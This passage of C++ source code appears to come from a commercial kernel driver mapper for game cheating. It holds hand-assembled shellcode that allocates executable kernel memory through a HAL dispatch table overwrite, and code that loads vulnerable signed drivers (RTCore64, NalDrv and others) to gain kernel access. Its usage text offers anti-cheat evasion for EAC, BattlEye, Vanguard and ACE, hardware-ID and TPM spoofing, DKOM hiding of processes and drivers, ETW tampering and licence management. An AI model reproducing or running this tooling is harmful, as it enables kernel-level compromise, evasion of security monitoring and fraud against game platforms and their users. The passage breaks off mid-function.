                            Log("PteBase     : 0x%llx  (MmPteBase global)\n",
                                (unsigned long long)pteBase);
                        }
                    }
                }
            }
        }
        Log("  .text scan: maskHits=%u\n", maskHits);
    }
    FreeLibrary(hDiskNtos);
    if (!pteBase) Log("FindPteBase: MmPteBase pattern not found\n");
    return pteBase;
}

// Allocate executable kernel pool via HAL dispatch table trick.
// Shellcode is written to caveKVA — a code cave in NalDrv .data (NX cleared before call).
// We save/restore the bytes we overwrite.
// Result is returned via HAL[2] (halKernelVA+8), a writable data slot.
//
// Uses ExAllocatePool2(POOL_FLAG_NON_PAGED_EXECUTE=0x40) on Win10 2004+.
// Falls back to ExAllocatePoolWithTag on older builds.
static size_t g_caveSize = 0;  // set by main() after cave search

static uint64_t KernelAlloc(KernelPrimitives& prim, uint64_t kernelBase,
                             uint64_t halKernelVA, uint64_t caveKVA, size_t bytes)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hNtos = LoadLibraryExA("ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!hNtos) { Log("LoadLibrary ntoskrnl failed\n"); return 0; }

    // Prefer ExAllocatePool2 (Win10 2004+) with POOL_FLAG_NON_PAGED_EXECUTE=0x40
    uint64_t eapUser = reinterpret_cast<uint64_t>(GetProcAddress(hNtos, "ExAllocatePool2"));
    bool usePool2 = (eapUser != 0);
    if (!usePool2)
        eapUser = reinterpret_cast<uint64_t>(GetProcAddress(hNtos, "ExAllocatePoolWithTag"));
    if (!eapUser) { FreeLibrary(hNtos); Log("ExAllocatePool not found\n"); return 0; }
    uint64_t eapKVA = kernelBase + (eapUser - reinterpret_cast<uint64_t>(hNtos));
    FreeLibrary(hNtos);
    Log("ExAllocate  : %s KVA=0x%llx\n",
        usePool2 ? "ExAllocatePool2(EXEC)" : "ExAllocatePoolWithTag",
        (unsigned long long)eapKVA);

    // Result slot: HAL[2] (halKernelVA+8) — writable data
    uint64_t resultKVA = halKernelVA + 8;

    // Save original bytes at the cave (we'll overwrite up to 72 bytes)
    uint8_t origCave[72] = {};
    prim.ReadKernelMemory(origCave, caveKVA, sizeof(origCave));

    // Save and zero the result slot
    uint64_t origHAL2 = 0;
    prim.ReadKernelMemory(&origHAL2, resultKVA, 8);
    uint64_t zero = 0;
    prim.WriteKernelMemory(resultKVA, &zero, 8);

    // Build shellcode
    uint8_t sc[72] = {};
    uint8_t* p = sc;
    auto w1 = [&](uint8_t  v) { *p++ = v; };
    auto w4 = [&](uint32_t v) { memcpy(p, &v, 4); p += 4; };
    auto w8 = [&](uint64_t v) { memcpy(p, &v, 8); p += 8; };

    w1(0x48); w1(0x83); w1(0xEC); w1(0x28);     // sub rsp, 28h
    if (usePool2) {
        w1(0xB9); w4(0x40);                       // mov ecx, 40h (NON_PAGED_EXECUTE)
        w1(0x48); w1(0xBA); w8((uint64_t)bytes);  // mov rdx, bytes
        w1(0x41); w1(0xB8); w4(g_poolTag);         // mov r8d, <random pool tag>
    } else {
        w1(0x31); w1(0xC9);                       // xor ecx, ecx (NonPagedPool=0)
        w1(0x48); w1(0xBA); w8((uint64_t)bytes);  // mov rdx, bytes
        w1(0x41); w1(0xB8); w4(g_poolTag);         // mov r8d, <random pool tag>
    }
    w1(0x48); w1(0xB8); w8(eapKVA);              // mov rax, eapKVA
    w1(0xFF); w1(0xD0);                           // call rax
    w1(0x48); w1(0xB9); w8(resultKVA);            // mov rcx, resultKVA
    w1(0x48); w1(0x89); w1(0x01);                // mov [rcx], rax
    w1(0x48); w1(0x83); w1(0xC4); w1(0x28);     // add rsp, 28h
    w1(0x31); w1(0xC0);                           // xor eax, eax
    w1(0xC3);                                     // ret
    size_t scSize = static_cast<size_t>(p - sc);
    Log("Shellcode   : %zu bytes -> cave 0x%llx (NalDrv .data, NX cleared by caller)\n",
        scSize, (unsigned long long)caveKVA);

    // Bounds check: ensure shellcode fits within the discovered cave
    if (g_caveSize && scSize > g_caveSize) {
        Log("Shellcode OVERFLOW: %zu bytes > cave %zu bytes — aborting\n", scSize, g_caveSize);
        prim.WriteKernelMemory(resultKVA, &origHAL2, 8);
        return 0;
    }

    // Write shellcode into the code cave (NalDrv .data — writable, NX cleared by caller)
    bool wrOK = prim.WriteKernelMemory(caveKVA, sc, scSize);
    Log("Cave write  : %s\n", wrOK ? "OK" : "FAILED");
    if (!wrOK) {
        prim.WriteKernelMemory(resultKVA, &origHAL2, 8);
        return 0;
    }

    // Patch HAL[1] → caveKVA and trigger via NtQueryIntervalProfile(Source=0)
    // NX was cleared for caveKVA before this function was first called
    uint64_t origHAL = 0;
    prim.ReadKernelMemory(&origHAL, halKernelVA, 8);
    Log("HAL+8 orig  : 0x%llx\n", (unsigned long long)origHAL);
    prim.WriteKernelMemory(halKernelVA, &caveKVA, 8);
    Log("Triggering NtQueryIntervalProfile (Source=0)...\n");

    auto NtQIP = reinterpret_cast<NTSTATUS(NTAPI*)(ULONG,PULONG)>(
        GetProcAddress(hNtdll, "NtQueryIntervalProfile"));
    ULONG interval = 0;
    NTSTATUS ntqipSt = SafeNtQIP(NtQIP, 0x0, &interval);
    Log("NtQIP       : 0x%08x interval=%u\n", (unsigned)ntqipSt, (unsigned)interval);

    // Restore HAL[1] immediately
    prim.WriteKernelMemory(halKernelVA, &origHAL, 8);

    // Read result, restore cave and result slot
    uint64_t result = 0;
    prim.ReadKernelMemory(&result, resultKVA, 8);
    prim.WriteKernelMemory(caveKVA, origCave, scSize);
    prim.WriteKernelMemory(resultKVA, &origHAL2, 8);

    Log("KernelAlloc : result=0x%llx (%zu bytes)\n", (unsigned long long)result, bytes);
    if (!result) { Log("ExAllocatePool returned NULL\n"); return 0; }
    return result;
}

int main(int argc, char* argv[]) {
    // Open log with write-through so data survives BSOD (no OS cache)
    // Use %TEMP% for log to avoid hardcoded suspicious paths
    char logPath[MAX_PATH];
    if (GetTempPathA(MAX_PATH, logPath)) {
        strcat_s(logPath, "pf_diag.tmp");
    } else {
        strcpy_s(logPath, "pf_diag.tmp");
    }
    g_logH = CreateFileA(logPath,
        GENERIC_WRITE, FILE_SHARE_READ, nullptr,
        CREATE_ALWAYS,
        FILE_FLAG_WRITE_THROUGH, nullptr);
    if (g_logH == INVALID_HANDLE_VALUE) {
        // Old zombie mapper may hold the file — use PID-suffixed fallback
        char fallback[MAX_PATH];
        if (GetTempPathA(MAX_PATH, fallback)) {
            char suffix[32];
            sprintf_s(suffix, "pf_diag_%lu.tmp", GetCurrentProcessId());
            strcat_s(fallback, suffix);
        } else {
            sprintf_s(fallback, "pf_diag_%lu.tmp", GetCurrentProcessId());
        }
        g_logH = CreateFileA(fallback,
            GENERIC_WRITE, FILE_SHARE_READ, nullptr,
            CREATE_ALWAYS,
            FILE_FLAG_WRITE_THROUGH, nullptr);
        strcpy_s(logPath, fallback);
    }
    Log("mapper_nal started\n");

    if (argc < 2) {
        Log("Usage: mapper_nal.exe <target_driver.sys> [--dbg <mask>] [--dbg-sub <mask>] [--eac <mask>]\n");
        Log("  --dbg <hex>    Arm PG-unsafe features: 1=DeepHide 2=PG_RESIST 4=KillTelemetry 7=all\n");
        Log("  --dbg-sub <hex> Sub-operation mask (0=all sub-ops)\n");
        Log("  --eac <hex>    EAC improvements: 1=OB 2=Report 4=CR3 8=Handle 10=Mem 20=Early 40=MiniFilter 7F=all\n");
        Log("  --ace <hex>    ACE strengthen:   1=Cb 2=DPC 4=HV 8=Early 10=CR3 20=Mem 3F=all\n");
        Log("  --adv <hex>    Adv ACE evasion: 1=HV/EPT 2=MemScan 4=ProcHide 8=EarlyInit F=all\n");
        Log("  --final <hex>  Final ACE harden: 1=Timing 2=Encrypt 4=Stack 8=Callback 10=HvDetect 20=SelfTest 3F=all\n");
        Log("  --deep <hex>   Deep AC resist: 1=EPT 2=MemScramble 4=ThreadCloak 8=Telemetry 10=PgStable 1F=all\n");
        Log("  --stealth <hex> Map stealth: 1=Timing 2=HideThread 4=Ioctl 8=Handle 10=CR3 20=DKOM 3F=all\n");
        Log("  --driver <name> BYOVD driver: trixx (default), corsair (WHQL, full-page map), ts, siv, nal (EAC-blocked)\n");
        Log("  --vanguard     Enable Vanguard-specific evasion during mapping\n");
        Log("  --ace-map      Enable ACE-specific hardening during mapping\n");
        Log("  --eac-map      Enable EAC-specific hardening during mapping\n");
        Log("  --full         Enable ALL features at max (stealth+deep+final+ace+eac+adv+vgk)\n");
        Log("  --auto         Smart AC detection: scan processes and auto-configure flags\n");
        Log("  --update       Re-send IOCTLs to already-mapped driver (skip mapping step)\n");
        Log("  --hwid <hex>   HWID spoof: 1=Disk 2=NIC 4=SMBIOS 8=Volume 10=GPU 20=Registry 3F=all\n");
        Log("  --hwid-clean   Clean traces after HWID spoofing\n");
        Log("  --hwid-restore Restore original HWID values\n");
        Log("  --hwid-ghost   Ghost mode: null/zero all serials instead of randomizing\n");
        Log("  --hwid-seed <hex> Use fixed seed for reproducible spoof values\n");
        Log("  --hwid-game <name> Apply game-specific HWID profile (apex/deltaforce/valorant/etc)\n");
        Log("  --hwid-list    List available game profiles\n");
        Log("  --delta <hex>  ACE/Delta Force hardening: 1=Early 2=CB 4=Report 8=HV 10=MemScan 1F=all\n");
        Log("  --apex <hex>   EAC/Apex: 1=CB 2=Report 4=Screenshot 8=MemEnc 10=Timing 20=Early 3F=all\n");
        Log("  --behav <hex>  Behavioral stealth: 1=Timing 2=Pattern 4=AntiSandbox 8=Telemetry F=all\n");
        Log("  --encptr <hex> Encrypted pointers: 1=Detect 2=Decrypt 4=Static 8=Runtime F=all\n");
        Log("  --battleye <hex> BattlEye: 1=CB 2=Report 4=Heartbeat 8=EarlyLoad 10=AntiDetect 1F=all\n");
        Log("  --kstealth <hex> Kernel stealth: 1=ProcHide 2=DrvHide 4=MemProt 8=MemEnc 10=AntiEnum 20=AntiAnalysis 3F=all\n");
        Log("  --dkom-proc <hex> DKOM process: 1=Hide 2=Restore 4=Token 8=Protect F=all [PG-UNSAFE]\n");
        Log("  --dkom-drv <hex>  DKOM driver: 1=Unlink 2=Wipe 4=Relink 7=all [PG-UNSAFE]\n");
        Log("  --dkom-thread <hex> DKOM thread: 1=Unlink 2=Cloak 4=Restore 7=all [PG-UNSAFE]\n");
        Log("  --dkom-eproc <hex> DKOM EPROCESS: 1=Hide 2=Elev 4=Prot 8=Unlink 10=Hook 20=Combined 3F=all [PG-UNSAFE]\n");
        Log("  --dkom-all     Enable all DKOM features [PG-UNSAFE, delayed BSOD risk]\n");
        Log("  --auth         Require user/password authentication with HWID lock\n");
        Log("  --no-auth      Skip authentication (admin override)\n");
        Log("  --tpm-spoof <hex> TPM spoof: 1=Disable 2=SpoofID 4=Clean 7=all\n");
        Log("  === Auth Management (admin) ===\n");
        Log("  --auth-add <user> <pass> [max_resets]  Add user to auth database\n");
        Log("  --auth-remove <user>                   Remove user\n");
        Log("  --auth-list                            List all users\n");
        Log("  --auth-reset-hwid <user>               Reset HWID lock for user\n");
        Log("  --auth-set-expiry <user> <days>        Set expiry (0=never)\n");
        Log("  --auth-disable <user>                  Disable user account\n");
        Log("  --auth-enable <user>                   Enable user account\n");
        return 1;
    }

    // Generate randomized pool tag before anything else
    g_poolTag = GeneratePoolTag();

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "--dbg") == 0 && i + 1 < argc) {
            g_dbgFlags = strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--dbg-sub") == 0 && i + 1 < argc) {
            g_dbgSubFlags = strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--ace") == 0 && i + 1 < argc) {
            g_aceStrFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--eac") == 0 && i + 1 < argc) {
            g_eacImpFlags = strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--adv") == 0 && i + 1 < argc) {
            g_advAceFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--final") == 0 && i + 1 < argc) {
            g_finalAceFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--deep") == 0 && i + 1 < argc) {
            g_deepAcFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--stealth") == 0 && i + 1 < argc) {
            g_mapStealthFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--vanguard") == 0) {
            g_vanguardMode = true;
        } else if (strcmp(argv[i], "--ace-map") == 0) {
            g_aceMapMode = true;
        } else if (strcmp(argv[i], "--eac-map") == 0) {
            g_eacMapMode = true;
        } else if (strcmp(argv[i], "--full") == 0) {
            g_fullMode = true;
        } else if (strcmp(argv[i], "--auto") == 0) {
            g_autoMode = true;
        } else if (strcmp(argv[i], "--update") == 0) {
            g_updateMode = true;
        } else if (strcmp(argv[i], "--hwid") == 0 && i + 1 < argc) {
            g_hwidFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--hwid-clean") == 0) {
            g_hwidClean = true;
        } else if (strcmp(argv[i], "--hwid-restore") == 0) {
            g_hwidRestore = true;
        } else if (strcmp(argv[i], "--hwid-ghost") == 0) {
            g_hwidGhost = true;
        } else if (strcmp(argv[i], "--hwid-seed") == 0 && i + 1 < argc) {
            g_hwidSeed = (UINT64)_strtoui64(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--hwid-game") == 0 && i + 1 < argc) {
            g_hwidGame = argv[++i];
        } else if (strcmp(argv[i], "--hwid-list") == 0) {
            Log("=== Available Game Profiles ===\n");
            for (int g = 0; g < (int)(sizeof(g_gameProfiles)/sizeof(g_gameProfiles[0])); g++) {
                Log("  %-12s  %-25s  features=0x%02x  %s\n",
                    g_gameProfiles[g].name, g_gameProfiles[g].display,
                    g_gameProfiles[g].features,
                    g_gameProfiles[g].ghost ? "[ghost recommended]" : "");
            }
            return 0;
        } else if (strcmp(argv[i], "--delta") == 0 && i + 1 < argc) {
            g_deltaFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--apex") == 0 && i + 1 < argc) {
            g_apexFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--behav") == 0 && i + 1 < argc) {
            g_behavFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--encptr") == 0 && i + 1 < argc) {
            g_encPtrFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--battleye") == 0 && i + 1 < argc) {
            g_battleyeFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--kstealth") == 0 && i + 1 < argc) {
            g_kstealthFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--dkom-proc") == 0 && i + 1 < argc) {
            g_dkomProcFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--dkom-drv") == 0 && i + 1 < argc) {
            g_dkomDrvFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--dkom-thread") == 0 && i + 1 < argc) {
            g_dkomThreadFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--dkom-eproc") == 0 && i + 1 < argc) {
            g_dkomEprocFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--dkom-all") == 0) {
            g_dkomProcFlags = 0x0F;
            g_dkomDrvFlags = 0x07;
            g_dkomThreadFlags = 0x07;
            g_dkomEprocFlags = 0x3F;
        } else if (strcmp(argv[i], "--cb-neutral") == 0 && i + 1 < argc) {
            g_cbNeutralFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--etw-tamp") == 0 && i + 1 < argc) {
            g_etwTampFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--adv-behav") == 0 && i + 1 < argc) {
            g_advBehavFlags2 = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--inline-hook") == 0 && i + 1 < argc) {
            g_inlineHookFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--stealth-load") == 0 && i + 1 < argc) {
            g_stealthLoadFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--mem-prot") == 0 && i + 1 < argc) {
            g_memProtFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--dkom-restore") == 0 && i + 1 < argc) {
            g_dkomRestoreFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--syscall-int") == 0 && i + 1 < argc) {
            g_syscallIntFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--kern-hide") == 0 && i + 1 < argc) {
            g_kernHideFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--tramp-hook") == 0 && i + 1 < argc) {
            g_trampHookFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--stealth-hook") == 0 && i + 1 < argc) {
            g_stealthHookFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--safe-dkom") == 0 && i + 1 < argc) {
            g_safeDkomFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--deep-ac-fix") == 0 && i + 1 < argc) {
            g_deepAcFixFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--unified-dkom") == 0 && i + 1 < argc) {
            g_unifiedDkomFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--post-verify") == 0) {
            g_postVerify = true;
        } else if (strcmp(argv[i], "--diag") == 0 && i + 1 < argc) {
            g_diagModeFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--driver") == 0 && i + 1 < argc) {
            const char* drv = argv[++i];
            g_useTrixx = g_useNal = g_useThrottleStop = g_useSivDriver = g_useRtCore = g_useCorsair = false;
            if (strcmp(drv, "trixx") == 0) g_useTrixx = true;
            else if (strcmp(drv, "ts") == 0) g_useThrottleStop = true;
            else if (strcmp(drv, "siv") == 0) g_useSivDriver = true;
            else if (strcmp(drv, "nal") == 0) g_useNal = true;
            else if (strcmp(drv, "rtcore") == 0) g_useRtCore = true;
            else if (strcmp(drv, "corsair") == 0) g_useCorsair = true;
            else { Log("[!] Unknown --driver '%s' (use trixx, corsair, ts, siv, nal, or rtcore)\n", drv); return 1; }
        } else if (strcmp(argv[i], "--auth") == 0) {
            g_authRequired = true;
        } else if (strcmp(argv[i], "--no-auth") == 0) {
            g_noAuth = true;
        } else if (strcmp(argv[i], "--no-cleanup") == 0) {
            g_noCleanup = true;
        } else if (strcmp(argv[i], "--tpm-spoof") == 0 && i + 1 < argc) {
            g_tpmSpoofFlags = (DWORD)strtoul(argv[++i], nullptr, 16);
        } else if (strcmp(argv[i], "--auth-add") == 0 && i + 2 < argc) {
            const char* user = argv[++i];
            const char* pass = argv[++i];
            uint32_t maxResets = 3;
            if (i + 1 < argc && argv[i+1][0] != '-') maxResets = (uint32_t)atoi(argv[++i]);
            AuthAdminAddUser(user, pass, maxResets);
            return 0;
        } else if (strcmp(argv[i], "--auth-remove") == 0 && i + 1 < argc) {
            AuthAdminRemoveUser(argv[++i]);
            return 0;
        } else if (strcmp(argv[i], "--auth-list") == 0) {
            AuthAdminListUsers();
            return 0;
        } else if (strcmp(argv[i], "--auth-reset-hwid") == 0 && i + 1 < argc) {
            AuthAdminResetHWID(argv[++i]);
            return 0;
        } else if (strcmp(argv[i], "--auth-set-expiry") == 0 && i + 2 < argc) {
            const char* user = argv[++i];
            uint32_t days = (uint32_t)atoi(argv[++i]);
            AuthAdminSetExpiry(user, days);
            return 0;
        } else if (strcmp(argv[i], "--auth-disable") == 0 && i + 1 < argc) {
            AuthAdminSetActive(argv[++i], false);
            return 0;
        } else if (strcmp(argv[i], "--auth-enable") == 0 && i + 1 < argc) {
            AuthAdminSetActive(argv[++i], true);
            return 0;
        }
    }

    // --full: enable everything at max
    if (g_fullMode) {
        Log("[*] Full mode: enabling all features at maximum\n");
        g_mapStealthFlags = MAP_STEALTH_ALL;
        g_vanguardMode = true;
        g_aceMapMode = true;
        g_eacMapMode = true;
        // NOTE: --dbg (PG-unsafe) NOT auto-enabled — causes delayed BSOD via PatchGuard
        if (!g_eacImpFlags) g_eacImpFlags = 0x7F;
        if (!g_aceStrFlags) g_aceStrFlags = 0x3F;
        if (!g_advAceFlags) g_advAceFlags = 0xF;
        if (!g_finalAceFlags) g_finalAceFlags = 0x3F;
        if (!g_deepAcFlags) g_deepAcFlags = 0x1F;
        if (!g_deltaFlags) g_deltaFlags = 0x1F;
        if (!g_hwidFlags) g_hwidFlags = 0x3F;
        if (!g_apexFlags) g_apexFlags = 0x3F;
        if (!g_behavFlags) g_behavFlags = 0x0F;
        if (!g_encPtrFlags) g_encPtrFlags = 0x0F;
        if (!g_battleyeFlags) g_battleyeFlags = 0x1F;
        if (!g_kstealthFlags) g_kstealthFlags = 0x3F;
        // Tasks 75-87: safe features auto-enabled in --full
        if (!g_cbNeutralFlags) g_cbNeutralFlags = 0x3F;
        if (!g_etwTampFlags) g_etwTampFlags = 0x1F;
        if (!g_advBehavFlags2) g_advBehavFlags2 = 0x3F;
        if (!g_inlineHookFlags) g_inlineHookFlags = 0x1F;
        if (!g_stealthLoadFlags) g_stealthLoadFlags = 0x0F;
        if (!g_memProtFlags) g_memProtFlags = 0x0F;
        if (!g_dkomRestoreFlags) g_dkomRestoreFlags = 0x0F;
        if (!g_syscallIntFlags) g_syscallIntFlags = 0x0F;
        if (!g_kernHideFlags) g_kernHideFlags = 0x1F;
        if (!g_trampHookFlags) g_trampHookFlags = 0x3F;
        if (!g_stealthHookFlags) g_stealthHookFlags = 0x3F;
        if (!g_safeDkomFlags) g_safeDkomFlags = 0x3F;
        if (!g_deepAcFixFlags) g_deepAcFixFlags = 0x3F;
        if (!g_unifiedDkomFlags) g_unifiedDkomFlags = 0x3F;
        g_postVerify = true;
        if (!g_diagModeFlags) g_diagModeFlags = 0x0F;
        if (!g_tpmSpoofFlags) g_tpmSpoofFlags = 0x07;
    }

    // Cache exe directory before PEB wipe (GetModuleFileNameA reads PEB)
    char g_exeDir[MAX_PATH] = {};
    {
        GetModuleFileNameA(nullptr, g_exeDir, MAX_PATH);
        char* sl = strrchr(g_exeDir, '\\');
        if (sl) *sl = 0; else { g_exeDir[0] = '.'; g_exeDir[1] = 0; }
    }

    // STEALTH: Wipe PEB command line immediately after parsing
    WipePebCommandLine();
    Log("[*] Stealth: PEB command line wiped\n");

    // Anti-crack: initialize integrity monitoring and anti-tamper
    if (!SecurityInit()) {
        Log("[!] Security init failed — integrity checks disabled\n");
    } else {
        Log("[+] Security: integrity CRC locked, anti-dump active, heartbeat started\n");
    }

    // Authentication gate: require login if --auth or if auth.dat exists
    if (!g_noAuth) {
        std::string dbPath = AuthGetDBPath();
        bool dbExists = (GetFileAttributesA(dbPath.c_str()) != INVALID_FILE_ATTRIBUTES);

        if (g_authRequired || dbExists) {
            AuthResult ar = AuthInteractiveLogin();
            if (ar != AUTH_OK) {
                Log("[!] Authentication failed: %s\n", AuthResultStr(ar));
                SecurityShutdown();
                return 1;
            }
            Log("[+] Authentication passed — HWID locked to this machine\n");
        }
    }

    // --auto: detect running AC and configure
    if (g_autoMode) {
        AutoDetectAC();
    }

    // Apply early stealth measures
    if (g_mapStealthFlags) {
        MapperStealthInit();
        MapperHideThread();
        Log("[*] Mapper stealth: flags=0x%x active\n", g_mapStealthFlags);
    }

    // Final Anti-Detection Polish: usermode anti-analysis scan
    if (g_mapStealthFlags || g_fullMode) {
        bool clean = MapperAntiAnalysis();
        if (!clean) {
            Log("[!] Anti-analysis: threats detected — continuing with caution\n");
        } else {
            Log("[+] Anti-analysis: environment clean\n");
        }
    }

    if (g_updateMode) goto skip_mapping;

    {
    // Auto-setup: create and start the BYOVD driver service
    // Skip if the driver device is already accessible (e.g. NalDrv loaded externally)
    {
        const char* svcTag  = g_useCorsair ? "CorsairLLAccess" : (g_useRtCore ? "RtCoreSvc" : (g_useNal ? "NalSvc" : (g_useSivDriver ? "SivSvc" : (g_useThrottleStop ? "TsSvc" : "TrixxSvc"))));
        const char* sysFile = g_useCorsair ? "CorsairLLAccess64.sys" : (g_useRtCore ? "RTCore64.sys" : (g_useNal ? "NalDrvIntel.sys" : (g_useSivDriver ? "SIVX64.sys" : (g_useThrottleStop ? "ThrottleStop.sys" : "TRIXX.sys"))));

        bool driverAlreadyLoaded = false;
        if (g_useCorsair) {
            HANDLE hTest = CreateFileW(L"\\\\.\\CorsairLLAccess", GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
            if (hTest != INVALID_HANDLE_VALUE) {
                CloseHandle(hTest);
                driverAlreadyLoaded = true;
                Log("[+] CorsairLLAccess device already accessible, skipping auto-setup\n");
            }
        } else if (g_useRtCore) {
            HANDLE hTest = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
            if (hTest != INVALID_HANDLE_VALUE) {
                CloseHandle(hTest);
                driverAlreadyLoaded = true;
                Log("[+] RTCore64 device already accessible, skipping auto-setup\n");
            }
        } else if (g_useNal) {
            HANDLE hTest = CreateFileA("\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE,
                0, nullptr, OPEN_EXISTING, 0, nullptr);
            if (hTest != INVALID_HANDLE_VALUE) {
                CloseHandle(hTest);
                driverAlreadyLoaded = true;
                Log("[+] NalDrv device already accessible, skipping auto-setup\n");
            }
        } else if (g_useTrixx) {
            // Always restart TRIXX — prior code patches leave stale I-cache
        }

        if (!driverAlreadyLoaded) {
        SC_HANDLE scm = OpenSCManagerA(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
        if (scm) {
            SC_HANDLE svc = OpenServiceA(scm, svcTag, SERVICE_ALL_ACCESS);
            if (svc) {
                SERVICE_STATUS ss{};
                QueryServiceStatus(svc, &ss);
                if (g_useTrixx && ss.dwCurrentState == SERVICE_RUNNING) {
                    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
                    for (int w = 0; w < 20; ++w) {
                        QueryServiceStatus(svc, &ss);
                        if (ss.dwCurrentState == SERVICE_STOPPED) break;
                        Sleep(250);
                    }
                    Log("[*] TRIXX service stopped for clean I-cache\n");
                    if (!StartServiceA(svc, 0, nullptr)) {
                        Log("[!] TRIXX restart failed: %u\n", GetLastError());
                    } else {
                        Log("[+] TRIXX service restarted OK\n");
                    }
                    Sleep(1000);
                } else if (ss.dwCurrentState != SERVICE_RUNNING) {
                    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
                    for (int w = 0; w < 20; ++w) {
                        QueryServiceStatus(svc, &ss);
                        if (ss.dwCurrentState == SERVICE_STOPPED) break;
                        Sleep(250);
                    }
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                    svc = NULL;
                } else {
                    Log("[+] %s service already running\n", svcTag);
                }
            }
            if (!svc) {
                char tmpDir[MAX_PATH]; GetTempPathA(MAX_PATH, tmpDir);
                std::string drvPath;
                const char* selfDir = g_exeDir;
                if (g_useCorsair) {
                    std::string candidates[] = {
                        std::string(selfDir) + "\\CorsairLLAccess64.sys",
                        std::string(tmpDir) + "CorsairLLAccess64.sys",
                    };
                    for (auto& c : candidates)
                        if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { drvPath = c; break; }
                } else if (g_useRtCore) {
                    std::string candidates[] = {
                        std::string(selfDir) + "\\RTCore64.sys",
                        std::string(tmpDir) + "RTCore64.sys",
                    };
                    for (auto& c : candidates)
                        if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { drvPath = c; break; }
                } else if (g_useSivDriver) {
                    std::string candidates[] = {
                        std::string(selfDir) + "\\SIVX64.sys",
                        std::string(tmpDir) + "SIVX64.sys",
                    };
                    for (auto& c : candidates)
                        if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { drvPath = c; break; }
                } else if (g_useTrixx) {
                    std::string candidates[] = {
                        std::string(selfDir) + "\\TRIXX.sys",
                        std::string(tmpDir) + "TRIXX.sys",
                    };
                    for (auto& c : candidates)
                        if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { drvPath = c; break; }
                } else if (g_useThrottleStop) {
                    std::string candidates[] = {
                        std::string(selfDir) + "\\ThrottleStop.sys",
                        std::string(tmpDir) + "ThrottleStop.sys",
                    };
                    for (auto& c : candidates)
                        if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { drvPath = c; break; }
                } else if (g_useNal) {
                    std::string candidates[] = {
                        std::string(selfDir) + "\\NalDrvIntel.sys",
                        std::string(tmpDir) + "NalDrvIntel.sys",
                        std::string(selfDir) + "\\NalDrv.sys",
                        std::string(tmpDir) + "NalDrv.sys",
                    };
                    for (auto& c : candidates)
                        if (GetFileAttributesA(c.c_str()) != INVALID_FILE_ATTRIBUTES) { drvPath = c; break; }
                }
                if (!drvPath.empty()) {
                    std::string finalPath = std::string(tmpDir) + sysFile;
                    if (drvPath.find(sysFile) == std::string::npos)
                        CopyFileA(drvPath.c_str(), finalPath.c_str(), FALSE);
                    else
                        finalPath = drvPath;
